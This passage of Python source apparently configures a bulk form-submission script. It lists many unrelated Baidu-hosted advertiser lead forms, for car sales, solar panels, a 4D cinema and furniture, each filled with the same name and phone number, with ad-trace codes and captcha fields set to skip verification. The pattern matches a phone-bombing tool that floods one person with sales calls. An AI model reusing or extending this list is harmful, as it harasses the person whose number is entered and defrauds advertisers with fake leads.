            "url": "https://jzapi.baidu.com/sjh-lexus/request.ajax?reqid=4b534c47-ff9c-4a58-2701-163117542540&path=sjh-lexus%2FMOD%2FLandingPageClueService%2FsubmitLandingPageClue",
            "data": {
                "path": "sjh-lexus/MOD/LandingPageClueService/submitLandingPageClue",
                "reqid": "4b534c47-ff9c-4a58-2701-163117542540",
                "userid": "1",
                "optid": "1",
                "params": {
                    "params": {
                "copid": 0,
                "cuid": None,
                "orderInfo": [{"name":"1","value":"7万以上","type":"select"},{"name":"2","value":"{}".format(n),"type":"input"},{"name":"3","value":"{}".format(t),"type":"phone"}],
                "ucId": 991395,
                "siteId": 55605905,
                "pageId": 70184035,
                "pageUrl": "https://aisite.wejianzhan.com/site/wjz4tky/4429561e-2159-41d5-8112-4aa7ddfab4b7",
                "pageUrlParams": "showpageinpc=1&timestamp={}".format(now),
                "actionProd": 2,
                "actionType": 1,
                "orderType": 269,
                "valid": True,
                "clkid": "0",
                "extraInfo": "{\"pvid\":\"163117535349817723642\"}",
                "pageInfo": "{\"showType\":0,\"auditVersion\":3,\"llp\":0,\"adaptType\":0,\"xcxAppKey\":\"\",\"siteTplType\":0}",
                "phoneDesensitive": False,
                "nameDesensitive": False,
                "compname": "senior-nichang",
                "applyPhone": ["{}".format(t)]
            }
            }
            }
            },
        {

            "url": "https://jzapi.baidu.com/rest/form/c/sessions/8643658960544925a5ff88c95b74d0d8/submissions?reqid=4b534c47-a652-47b4-062e-{}".format(now),
            "data": {
            "input": [{
                "code": "XCro",
                "value": "{}".format(n),
                "name": "称呼",
                "type": "name"
            }, {
                "code": "Txpw",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 87746411,
                "tuoguan_site_id": 57527478,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163117595700915060536",
                "exp_ids": "70819-1_74324-1_74348-1_69059-1_60975-dz_54211-1_62230-1_53921-1_70146-dz_74033-1_65247-1_55294-1_72527-1_72440-dz_73170-dz_73350-1_57358-1_54209-dz_73210-dz_73315-dz_49795-1_49794-1_74840-1_74657-1_50632-dz_69002-1_49904-1",
                "page_url": "https://aisite.wejianzhan.com/site/wjza3fwv/63ef70ce-ebdc-419f-b942-8c1892b44c66?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "akah56plfmp31gjjh9b0d",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/wjza3fwv/63ef70ce-ebdc-419f-b942-8c1892b44c66?fid=nHRsn1nYPjRvP1RvPWcdrjTvnWwxnWcdg1D&ch=4&bfid=fbuFw0cKljm00jAZCI000rD00fAmlqCKcB6fDfs0000A-Kx1w60000f0gf0DEP5jzzFU8Ihb1oXqgi0VP1DkEP5jzt1dE53VE2OPkU1HstEyYPjDSYrdlf&bd_vid=nHRsn1nYPjRvP1RvPWcdrjTvnWwxnWcdg17xnH0s"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 13141187,
                    "scene_code": "wwpxee",
                    "user_id": 31124376
                }
            }
            }
        },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions/287f3cfe1b9948a89aa6e4b22f0ae05f/submissions?reqid=4b534c47-7586-4755-0fc3-{}".format(now),
            "data":{
            "input": [{
                "code": "dXkk",
                "value": "{}".format(n),
                "name": "姓名",
                "type": "name"
            }, {
                "code": "ksue",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }, {
                "code": "StQh",
                "value": "天津市 天津市",
                "name": "开店城市",
                "type": "city"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 73767108,
                "tuoguan_site_id": 56131417,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163117613005116978662",
                "exp_ids": "70819-1_65247-1_49795-dz_72527-dz_74348-1_69059-1_60975-dz_72440-dz_74840-dz_73242-dz_62230-1_73210-1_72757-dz_73350-1_69002-dz_73315-dz_74098-dz_50632-dz_73708-1_67560-1_53921-dz_ab_wildcard_dyn-2",
                "page_url": "https://aisite.wejianzhan.com/site/wjz0f6bb/ad1bc407-2506-45ac-951a-4fa174c2d155?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "24246mcae3dv1gjjhhf0c",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/wjz0f6bb/ad1bc407-2506-45ac-951a-4fa174c2d155?source=bd&plan=110&369"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 12005652,
                    "scene_code": "wwpxee",
                    "user_id": 29362308
                }
            }
        }
        },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data": {
        "input": [{
            "code": "QbSY",
            "value": "{}".format(n)
        }, {
            "code": "hRdG",
            "value": "{}".format(t)
        }],
        "ad_trace": {
            "anti_code": "http://www.baidu.com/baidu.php?url=0f0000jZHD87BOAle4_s6AsiRn3l2mFIL8DIJl4VnAX_Qil4QFXTEPbBtVQzC3V8NHkxQPKdP4tcqIZ7i6Udyx2MbiTteVO6DfjRy3-QxSlCBv1X6tuoKL0FHgPriMc5FU5D79hf82UliDEstxLOB_XrrcQ4ObiOshjdeSWLCFmCHPic0KP5h5t2H5pzjiWZxjA6joQd_Xt1nyL0LpGiBoeUMo3d.DY_NR2Ar5Od66uxAS6Mz3D4g_kTPHniccLYDsTAg9JEerj66eDeShkhSE58zIhH5vUeVvIMFx34OAleuI3ebdq5AOEoknwxEkT54_ElZUSUqEgv1xEq5AQqE4xqBQqEHvOhz3rBQq8AeNgt8_PHZudEd3hPISjlt7b5O63STgWubSSS45l7-bLz__dOznxO6LxlOOKSgOBdxoS88rzz1Osxk5kBOdOeQeQQQQPIhogutJOqMOudT5oOwOPOkxtgwbolnMqZV4ROovxeRYxO7lt5_OvCVdNL43Od15OeZU7-JOROxCxVS19C5Og4tPxdHOkxer8EZlLw4xoSxqOg3YZxJpN2s1f_urr1FYJ0.U1Yk0ZDq1UUgz6Kspynqn0KY5TvvdtC0pyYqnWcd0ATqUvNsT1D0Iybqmh7GuZR0TA-b5Hf0mv-b5Hb10AdY5HfsPWKxnH0kPdtknjD40AVG5HD0TMfqPjTY0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0Uynqn1nsrHfsrHc1n-tkrHDsnHT3rHm1g100TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLGCXZb0pywW5R9rffKspZw45fKYmgFMugfqPWPxn7tkPH00IZN15Hndnjc3rjc3rH04nW03rjfdPHf0ThNkIjYkPWnknHTvn1bsPW010ZPGujdBPvfLPW79P10snjNhnvRz0AP1UHYdwHRYrHmknRR1wj7jPDwa0A7W5HD0TA3qn0KkUgfqn0KkUgnqn0KbugwxmLK95H00XMfqn0KVmdqhThqV5HKxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7ts0ZK9I7qhUA7M5H00uAPGujYs0ANYpyfqQHD0mgPsmvnqn0KdTA-8mvnqn0KkUymqn0KhmLNY5H00pgPWUjYs0A7buhk9u1Yk0Akhm1Ys0AwWmvfq0Zwzmyw-5H00mhwGujYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPsKBIjYs0Aq9IZTqn0KEIjYk0AqzTZfqnBnsc1nWPanLPjmsnjD3n1DWPjb4nj0WPHb4nj08nj0snj0sc1nWPansczYWna3snj0knj0Wni3Ynj0snj00XZPYIHY1nW61PjTLr0KkgLmqna3zn7tsQW0sg108njKxna3YP-tsQW01g108rH7xna3sP7ts0AF1gLKzUvwGujYs0ZFEpyu_myTqnfKWIWY0pgPxmLK95H00mL0qn0K-TLfqn0KWThnqn164PjR&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HD1nWfLnHmYnHb3rjckPjcvnHfvg1czPNts0gTq1UUgz67k5TvvdtCKIHY1nW61PjTLr07Y5HDvn1DkP1m1rHDKUgDqn0cs0BYKmv6quhPxTAnKUZRqn07WUWdBmy-bIfD1PWckPjmYn1T4&word=",
            "searchid": "b7d761a70005f3e2",
            "cmatch": 225,
            "rank": 0
        },
        "_embedded": {
            "session": {
                "solution_id": 13426486,
                "scene_code": "lpgrjs"
            }
        }}
    },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions/602620a447af4248a1e1531117e0f585/submissions?reqid=4b534c47-1404-4cd6-7ce2-{}".format(now),
            "data":{
            "input": [{
                "code": "qEUx",
                "value": "{}".format(n),
                "name": "称呼",
                "type": "name"
            }, {
                "code": "nwqQ",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }, {
                "code": "Ycga",
                "value": "光伏价格",
                "name": "更多资料领取",
                "type": "checkbox"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 88679111,
                "tuoguan_site_id": 57709564,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163117847977217429552",
                "exp_ids": "70819-1_49793-dz_72527-dz_72913-1_74348-1_69059-1_68586-dz_70213-1_74840-dz_62230-1_74324-dz_70146-dz_65247-1_72440-1_55294-1_73242-dz_57358-dz_54211-dz_73350-1_74539-1_60975-1_74098-dz_50632-dz_73315-1_53921-dz_ab_wildcard_dyn-2",
                "page_url": "https://aisite.wejianzhan.com/site/wjz2nvyx/3d6c966b-3892-4c0f-a1ca-39a3e6f883f7?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "0h053riftld51gjjjoq0c",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://aisite.wejianzhan.com/site/wjz2nvyx/3d6c966b-3892-4c0f-a1ca-39a3e6f883f7?fid=nHTLn1bzPjmdPHndPHbLrHbdnWFxnWcdg1f&ch=4&bfid=fbuFw0cK39mK0n7vQEm00rD0K0ZG3staG1x5rss0000_i2-Dif0000f0gf0D1UUgzBOFeVEpcQMBVOzLCogMdUePVVx2cQrMEPQy_TOlcjcsnWZDlVx8Yn2z8T14dxlzLthX32Y&bd_vid=nHTLn1bzPjmdPHndPHbLrHbdnWFxnWcdg1wxnH0s"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 13515625,
                    "scene_code": "wwpxee",
                    "user_id": 34595817
                }
            }
        }
        },
        # {
        #     "url": "https://www.suofeiya.com/index.php?a=Event&m=baomingNew",
        #     "data": {"a_name": "{}".format(n),
        #             "a_mobile": "{}".format(t),
        #             "a_province": "P004",
        #             "a_city": "C001",
        #             "a_district": "CT0001",
        #             "a_url": "https://www.suofeiya.com/",
        #             "topic":"sem1144.html?utm_source=bdPCsanhxcs&utm_medium=baidu&utm_campaign=sem&renqun_youhua=705451&bd_vid=10807480153085234759",
        #             "latentDemand": "线上量尺免费设计,110㎡以上",
        #             "a_display": 1,
        #             "baoming_token": "90e42f7d2d8956309b3569fe110e9c5f"}
        # },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data":{
            "input": [{
                "code": "cMeh",
                "value": "{}".format(n)
            }, {
                "code": "Pvyf",
                "value": "{}".format(t)
            }],
            "ad_trace": {
                "anti_code": "http://www.baidu.com/baidu.php?url=0f0000jZHD87BOAlezqkbkZxx1BH5XZDPZgpqpHgYpFl07iVjpkrY9bnVaUxX7kc_D_25u9p92VrpCTVJaHgkg7swkn-6tJ04BzeVGIx9KX7KiFwNwsEJneF6aeWBT51EoZ5SbcYVQgC0GsT3-J5TeiNWdZ3zUdHyJlJ2b5PzjyMSRotzVMZds9Wka9rufiwLLZIIyfjhDQsJqqaDjZ2GsRsIzQ4.DY_NR2Ar5Od66xAS6MzEukmDfwECF63nEjIsOw7o6ELUVMu_zyueJlSrx_zgTTS1FYG1q-ppvIXHxuu8vIqXFBQqSZO_xhOUYtx1NO2EtdT5OmOPSLuqDvy1WPSOSgCBOU98dNOQojRkvIUqXFWgx6SEKujO355lP5O6_ObpXzzWOvQQFE-uuoqVZNIo_SgqZSFspQ5qI--hyUtxSkZYxQG____dvpVIMz84xqMOy-hJ9OvZFlQ8gOuOdGzOYXj3xY53hEVIYx-IhEO5SpUOp8h3XZuenBxSkYNgIE4lLSxO78SE38tqbrrOOsxYx1xqWoxIzOwBmBOx9OeZ4Evq5ZtdxzoOPgjOv51xVvxwP-_31xEO-lcEv3UVNxWYwxEvwqmeCp5UBmqEltbIXecOv1xQGq8el3SWSB4i_nYQAl1FYJ0.U1Yk0ZDqd_URe0KspynqnfKY5U1iEVOykVH_0A-V5HczPfKM5yq-TZnk0ZNG5yF9pywd0ZKGujYY0APGujY4nsKVIjYYnjmsg1DsnH-xnH0kPsKopHYk0ZFY5HfLP0KBpHYkPHNxnHR3g1csP7tznHIxPH010AdW5Hn1nj6snjbvrHFxnH6vnWmsrHTdPNtkrHDznWDYrj0z0Z7spyfqn0Kkmv-b5H00ThIYmyTqn0K9mWYsg100ugFM5H00TZ0qn0K8IM0qna3snj0snj0sn0KVIZ0qn0KbuAqs5H00ThCqn0KbugmqTAn0uMfqn0KspjYs0Aq15H00mMTqnH00UMfqn0K1XWY0mgPxpywW5gK1QyIlUMn0pywW5R9rffKspZw45fKYmgFMugfqn17xn1Ddg1D40ZwdT1YknjRsnWfzPW6kP1TsPjRvn16zr0Kzug7Y5HDvn1Dkrj03nHbznW60Tv-b5y7bnjn1rHTvnj0snHmvmhm0mLPV5HN7PHf4PWDkwHPDnRnYwDc0mynqnfKsUWYs0Z7VIjYs0Z7VT1Ys0Aw-I7qWTADqn0KlIjYk0AdWgvuzUvYqn7tsg100uA78IyF-gLK_my4GuZnqn7tsg100TA7Ygvu_myTqn0Kbmv-b5H00ugwGujYVnfK9TLKWm1Ys0ZNspy4Wm1Ys0Z7VuWYs0AuWIgfqn0KGTvP_5H00mywhUA7M5HD0UAuW5H00uAPWujY0IZF9uARqPWRsnH0d0AFbpyfqnHmknH6YwDnYfW-7n1bYnj0vPjTzwD7jPbR3njf1nHT0mMfqn0KEmgwL5H00ULfqnfKETMKY5HcWnan1c1fWP1RYrHRdPjT4c1R3nj0sc1Rdnj0sQW0snj0snankc1fWnanVc108njDsrjmYc1D8nj0snH0s0Z91IZRqPHRzrHR1n0KkgLmqna31ndtsQW0sg108njKxna3vnNtsQW01g108rjuxna3sP-ts0AF1gLKzUvwGujYs0ZFEpyu_myTqnfKWIWY0pgPxmLK95H00mL0qn0K-TLfqn0KWThnqnW04nWR&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HDzPjmvrjTkn1TzPjmsPW6srjbdg1czPNts0gTqEP2SLqUAdrsKTHLykVH_0gRqPHRzrHR1n07Y5HDvn1Dkrj03nHbKUgDqn0cs0BYKmv6quhPxTAnKUZRqn07WUWdBmy-bIfD1PW03PWczPWRd&word=",
                "searchid": "ad033976000166bf",
                "cmatch": 225,
                "rank": 0
            },
            "_embedded": {
                "session": {
                    "solution_id": 4160820,
                    "scene_code": "lpgrjs"
                }
            }
        }
        },
        # {
        #     "url": "https://promotion-zh-api.tuya.com/api/v2/business/add",
        #     "data":{
        #     "customerName": "{}".format(n),
        #     "contactPerson": "{}".format(n),
        #     "contactPhone": "{}".format(t),
        #     "provinceCity": ["110000", "110100"],
        #     "wantTo": ["开发台灯等智能照明产品", "代理台灯等智能照明产品"],
        #     "demandCategory": "太阳能灯",
        #     "dataSource": "PRO_179",
        #     "countryCode": "+86",
        #     "secureKey": {
        #     "challenge": "8c3d1501a48ee309ae1b031e056edac8",
        #     "validate": "1b842f22dbc12d36582f374d16113289",
        #     "seccode": "1b842f22dbc12d36582f374d16113289|jordan",
        #     "clientType": "pc"
        #         }
        #     }
        # },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data": {
                "input": [{
                    "code": "eTtp",
                    "value": "4D影院"
                }, {
                    "code": "trYt",
                    "value": "{}".format(t)
                }],
                "ad_trace": {
                    "anti_code": "http://www.baidu.com/baidu.php?url=0600000mERFSCHNvpTFZvqxCaZ2m5q58CAUj8AWLuUUlN7h66NCFeNbmh-8eLRD4-jQKKogquKNaqe59-EQ6rY52rFF0aeTyNrkGpj9GB7KXjtnYGx8pzZFMuryGvY8takaayglETPXan7zDNCkS4BD-dlZYLzMIQRc9uHIUKACXTUM5JnwZPDSETIVh6mUgTq1lisgch4NMxAG3KI3-wZN6LmPh.DR_aGSJoVxhdYgTaubfuqLBGyAp7BEk_vy20.U1Yk0ZDqdOMi16KspynqnfKY5UpE8PjgSIQr0A-V5HczPfKM5yqbXWD0Iybqmh7GuZR0TA-b5Hf0mv-b5Hb10AdY5HfsPWKxnH0krNtknjDL0AVG5HD0TMfqPjTY0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0Uynqn1c3n1b4rjnLn-tkrjm1nj01nHnvg1D4nHDYnHD1rH00TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLGCXZb0pywW5R9rffKspZw45fKYmgFMugfqn17xn1DYg1D40ZwdT1YzPjnsPWRdPj6krjb3rjbsPjT10ZF-TgfqnHm1nHcYPjcdnj6LP6K1pyfqm1c1PyF9nhcsnj0knjIbP0KWTvYqrDfzwjnzPH6vP1RkwbRkn0K9m1Yk0ZK85H00TydY5H00Tyd15H00XMfqn0KVmdqhThqV5HKxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7ts0ZK9I7qhUA7M5H00uAPGujYknjT1P1fkrjcY0ANYpyfqQHD0mgPsmvnqn0KdTA-8mvnqn0KkUymqn0KhmLNY5H00pgPWUjYs0A7buhk9u1Yk0Akhm1Ys0AwWmvfq0Zwzmyw-5H6dnjRkn0KBuA-b5HDvnHD3PDwjPDc4wHn4Pj0sPWfLnbwKf1u7rj0Yn1DL0AFY5HD0Uv7YI1Ys0AqY5H00ULFsIjYsc10Wc10Wnansc108nj0snj0sc10WnansczYWna3snj0snj0Wni3snj0knj00XZPYIHYknjcvPWDkP6KkgLmqna34n-tsQW0sg108njKxna3YPdtsQW0zg108rHuxna3vrNts0AF1gLKzUvwGujYs0ZFEpyu_myTqn0KWIWY0pgPxmLK95H00mL0qn0K-TLfqn0KWThnqPHbznH0&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HD1rHbYnWbvnHDsrHTsnHDkrHRvg1czPNts0gTqVJS3YPx4Y_3KTHLgSIQr0gRqnH0zPWmknHmKIjYkPWnknWfYnWRk0ydk5H0an0cV0yPC5yuWgLKW0ykd5H0Kmv3qmh7GuZRKnHRkrjRLnWf4Ps&cegduid=nH0zPWmknHm&solutionId=4431236&word=",
                    "searchid": "c235ba2b000107d4",
                    "cmatch": 225,
                    "rank": 0
                },
                "_embedded": {
                    "session": {
                        "solution_id": 2992114,
                        "scene_code": "lpgrjs"
                    }
                }
            }
        },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data": {
                "input": [{
                    "code": "pyMx",
                    "value": "北京"
                }, {
                    "code": "Xurj",
                    "value": "{}".format(t)
                }],
                "ad_trace": {
                    "anti_code": "http://www.baidu.com/baidu.php?url=0600000mERFSCHNvpIiNRvJU7EmF3d8eGClaE1b3iCHqHSLpVhgxtg0P4ocrWJH8rDD7-1spYb7EZwqPOUkzGlp9mgS6Sbb_UWtF5MlGz0wHSv5CBIfCLt7-fSoHhXz6ZrCNV8M0_a6PDlDSH_KgrjuMMViFPBklMw9KmahJKzhq0LfNAb0Y-om6aAmwwpg9WxhT0ktUT6zDEUZ10xFL6ndQ-IlJ.7b_NR2Ar5Od66uxAS6Mz3D4g_kTPHniccLYDsTAg9_hq-dYZWIXMujuuMuL4PSx_88_1_lqtrxkzfqBX-h1k_oEeltHDgeOSEWSpE4xqWtdXhetvg4IM4EL3XvQQ7Ov51xVOSjCBOU98dNOQojRkvIUqXFWgx6SEKujO35oO3PI-M4VvegOkwvyHx2z1gexqx_odvNpX-MSWYOleQQQ2OqoGOgC______dvpVIMzt4hxl5YnOfMtgxtjSW41nOYxCuSB5-O3_XzetSEGvxYxqoqxhhEGtOuYtnRgeOSdveECOZlrZO_T54EqMqElrypEFAe1Ce5qM5olmOd5mGyAp7WWuboR.U1Yk0ZDqEraOv0KspynqnfKY5UElVeSt3QOm0A-V5HczPfKM5gK1IZc0Iybqmh7GuZR0TA-b5Hf0mv-b5Hb10AdY5HfsPWKxnH0krNtknjDL0AVG5HD0TMfqPjTY0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0UynqnWb3PH6krHD4PNtkrjmzPHmzP1bYg1D4nHD1n1m3n1f0TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLGCXZb0pywW5R9rffKspZw45fKYmgFMugfqn17xn1Ddg1D40ZwdT1YLPjbvnWD1nHnvrHRzPHbdn10d0ZF-TgfqnHm1nHcYPjfzPH63nsK1pyfquAnYnhPhujnsnj0snHfzP0KWTvYqrDfzwjnzPH6vP1RkwbRkn0K9m1Yk0ZK85H00TydY5H00Tyd15H00XMfqnfKVmdqhThqV5HKxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7ts0ZK9I7qhUA7M5H00uAPGujYs0ANYpyfqQHD0mgPsmvnqn0KdTA-8mvnqn0KkUymqn0KhmLNY5H00pgPWUjYs0A7buhk9u1Yk0Akhm1Ys0AwWmvfq0Zwzmyw-5HRknjfsnsKBuA-b5HDvnHD3PDwjPDc4wHn4Pj0sPWfLnbwKf1u7rj0Yn1DL0AFY5H00Uv7YI1Ys0AqY5H00ULFsIjYsc10Wc10Wnansc108nj0snj0sc10WnansczYWna3snj0snj0Wni3snj0knj00XZPYIHY1PjTknWRz0Z7xIWYsQWbkg108njKxna3sn7tsQWmsg108njPxna34rNtsQWRLg100mMPxTZFEuA-b5H00ThqGuhk9u1Ys0APv5fKGTdqWTADqn0KWTjYs0AN1IjYs0APzm1YkP1cYr0&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HDdrjTkPjTvPHfkrHRznH01Pjmsg1czPNts0gTq8OJLEe16Eq6KTHvt3QOm0gRqn1fLnHcdn67Y5HDvn1DzPjfYnWmKUgDqn0cs0BYKmv6quhPxTAnKUZRqn07WUWdBmy-bIfDzn1f3P1RvP16d&cegduid=n1fLnHcdn6&solutionId=6339813&word=",
                    "searchid": "dc42cfd300001424",
                    "cmatch": 225,
                    "rank": 0
                },
                "_embedded": {
                    "session": {
                        "solution_id": 3185578,
                        "scene_code": "lpgrjs"
                    }
                }
            }
        },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data":{
                "input": [{
                    "code": "Axsz",
                    "value": "{}".format(n)
                }, {
                    "code": "DvoA",
                    "value": "{}".format(t)
                }],
                "ad_trace": {
                    "anti_code": "http://www.baidu.com/baidu.php?url=0600000mERFSCHNvpfLWGhOgj8kN3QgNGDP6a4NyYGKsIwTDVyCq_ZjGK2TzJ-LdujdFGGlCPrL8Sv9Jucsi6TpL9U9C3P4_FD1XcZ9J8HBwV2omG1RaY7k39ewFkF1_8nHpi5VnzYzYWrUscqN-UB4kwCJvLJFBHHhJiHp07fG0_HnVlIL5qqlbm07l-YmUyv8Bj5SFSo-agvNSM1aaQ4Ckb0RR.Db_a5CY_33Yf5CfgLfnYpnjlDZjCCsNsm3mrAj0SjU1eOhSZ5xIuE34t-hi81uko_LIPxZcGyAp7B8EGLtN0.U1Yk0ZDqzXBtk6KspynqnfKY5TpqsSUFlQ1AkXjwVIAM1eas30KGUHYznWR0u1dEugK1n0KdpHdBmy-bIfKspyfqP0KWpyfqrHn0UgfqPj0vn7tknjDLg1csPH7xnH0krfKopHYk0ZFY5HfLP0KBpHYkPHNxnHR3g1csP7tznHIxPH010AdW5Hn1njbsnHfLPHIxnHbsrHbkPHDzn7tznjRkg100TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qnfKzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLGCXZb0pywW5R9rffKspZw45fKYmgFMugfqn17xn1DYg1D40ZwdT1Ykn1D1n16kP101PW0kPHmdPWDdPsKzug7Y5HDvn1DzPHf4Pj0krHb0Tv-b5ym1rAuBrHm1nj0sPj6vmyR0mLPV5H9Dnbf1nWR3PWTdnRu7nH00mynqnfKsUWYs0Z7VIjYs0Z7VT1Ys0ZGY5H00UyPxuMFEUHYsg1Kxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7tsg100TA7Ygvu_myTqn0Kbmv-b5H00ugwGujYVnfK9TLKWm1Ys0ZNspy4Wm1Ys0Z7VuWYs0AuWIgfqn0KGTvP_5H00mywhUA7M5HD0UAuW5H00uAPWujY0IZF9uARqPWTsn10k0AFbpyfqnHmknH6YwDnYfW-7n1bYnj0vPjTzwD7jPbR3njf1nHT0UvnqnfKBIjYk0Aq9IZTqn0KEIjYk0AqzTZfqnBnsc1D4c1nWP16krHckP164c1nsnj0sc1nsnj0sQW0snj0snankc1nWnankPznsQW0krj0vPBnsQWTLnj0sn0K3TLwd5Hc4rjTvP1030Z7xIWYsQW6vg108njKxna3sn7tsQWDzg108njFxna34n7tsQWDzg100mMPxTZFEuA-b5H00ThqGuhk9u1Yk0APv5fKGTdqWTADqn0KWTjYs0AN1IjYs0APzm1YkPWfsP0&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HDLPHRsPjRsnH0LP1n4n104P1fzg1czPNts0gTqkoLj4_MCEnU73PAdYpx5_Qj60gDqzXBtk67d5Hc4rjTvP1030gfqnHm1nHcdPjbYn07VTHYs0W0aQf7Wpjdhmdqsms7_IHYs0yP85yF9pywd0HDYnHfzPjmzn16&word=",
                    "searchid": "f38fb963000486ae",
                    "cmatch": 225,
                    "rank": 0
                },
                "_embedded": {
                    "session": {
                        "solution_id": 9263476,
                        "scene_code": "lpgrjs"
                    }
                }
            }
        },
        {
            "url": "https://jzapi.baidu.com/fengming-c/clue-audit/risk/lp-submit/expose?reqid=4b534c47-d6d8-415b-f62d-{}".format(now),
            "data": {
            "clueJoinId": "210914164759561300",
            "userId": 32159754,
            "solutionId": 7172937,
            "solutionType": "form",
            "lpInfo": {
                "appId": 269,
                "siteId": 56025276,
                "pageId": 73805920,
                "lpUrl": "https://isite.baidu.com/site/wjzvzngw/c0bcf671-9d53-445d-af27-8d1dc0aab097?fid=nH6srHnLrjTLrj0krH6snjb4nH-xnWcdg1D&ch=4&bfid=fbuFw0cK53sK0KtnAE_00rD00fD28rCKwEnJss_000jPmE79ff0000f0gf0Dz8hLJaz1zTWQ8xJeoToGVlBs3aLK3eE4V2ZwGtSsQT5BVqZKenB9nHpqvoMl8lvO16W1_it&bd_vid=10870066399423383893"
            },
            "clueInfo": {
                "formControls": [{
                    "name": "你的手机号码",
                    "value": "{}".format(t),
                    "type": "phone"
                }],
                "captcha": {
                    "type": "no",
                    "phoneNo": "{}".format(t)
                }
            },
            "clientInfo": {},
            "adInfo": {
                "referrer": "https://www.baidu.com/baidu.php?url=K60000avpXkFvm720KzT4ZcaUPVmQQK-t5EH6SEUYsAXDbQNnqE0EXmLiddCW838mIBMBFyZ6PHnqVky7cEG_3I5A-wYychsGYqri6fyPsmny2YZciUk0z3Henfk2J9CCqmtAIop7t2HHupG1L6ENONKgBEuIrKAsAoMYl9bmpqMhcRr9DAsVvK1S91Se2IiCs9xY11VbSXUN8u07fwf0Jc0ukwW.7Y_NR2Ar5Od66xAS6MzEukmDfwECF63nEjqZjh3ccUQ3IxH3d4qqveWMer1IIMud45Z5_8o89_uuE_LS5xgBmBOxlm4EL3Ed1uxY5d1uUrvUqOGWBzLqbgeSxCBOU98dNOQojRkvIUqXFWgx6SEKujO3PLA5OsyxSa97ex5-__hSN-hE4uPbLsOSj6t3EqJr5-___zOhYSxWEdleQQQPIhogut8ZuNSEOpu3pSZqjqEtS1COvb8OfISGOkRxy5B1SEOsTRSxuOku54ZKSGfOA5tOlAedO3EuOcOtamEgx7SOWqMYrOBRI-Zl5lPxHSLgzEC2N9h9m3er1_v2.U1Yk0ZDqz8hLJ0Kspynqn0KsTv-MUWdbPWubPvPbrAwbPj6dPH9-uHFhuhm4rADdnAfkryfsr0KY5U5Fzn84So8Vz8hLJQj60A-V5HczPfKM5yq-TZnk0ZNG5yF9pywd0ZKGujYY0APGujY4nsKVIjYknjDLg1csPWFxnH0krfKopHYs0ZFY5HndPfKBpHYkPHNxnHR3g1csP7tznHIxPH010AdW5HD4njbsnWTYrHKxnWndPWb3rjD1nWwxn0KkTA-b5H00TyPGujYs0ZFMIA7M5H00mycqn7ts0ANzu1Ys0ZKs5H00UMus5H08nj0snj0snj00Ugws5H00uAwETjYk0